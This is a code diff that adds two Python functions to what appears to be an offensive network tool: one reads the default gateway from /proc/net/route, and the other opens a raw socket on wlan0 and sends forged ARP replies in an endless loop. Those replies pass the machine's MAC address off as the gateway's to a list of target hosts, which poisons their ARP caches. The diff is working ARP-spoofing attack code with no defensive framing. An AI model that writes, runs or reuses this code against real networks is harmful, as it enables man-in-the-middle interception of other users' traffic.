@@ -36,3 +36,28 @@ def create_dst_ip_addr():
         dst_ip_addr += chr(int(ip_src_dec[i]))
     return dst_ip_addr
 
+def get_default_gateway_linux():
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+            return socket.inet_ntoa(pack("<L", int(fields[2], 16)))
+
+def create_pkt_arp_poison():
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
+    s.bind(("wlan0", 0))
+
+    while(1):
+        for lmfao in getPoisonIPs():
+            src_addr = get_src_mac()
+            dst_addr = lmfao[0]
+            src_ip_addr = get_default_gateway_linux()
+            dst_ip_addr = lmfao[1]
+            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
+            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
+            checksum = "\x00\x00\x00\x00"
+            ethertype = "\x08\x06"
+            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
+                   + dst_mac_addr + dst_ip_addr + checksum)
+        time.sleep(2)
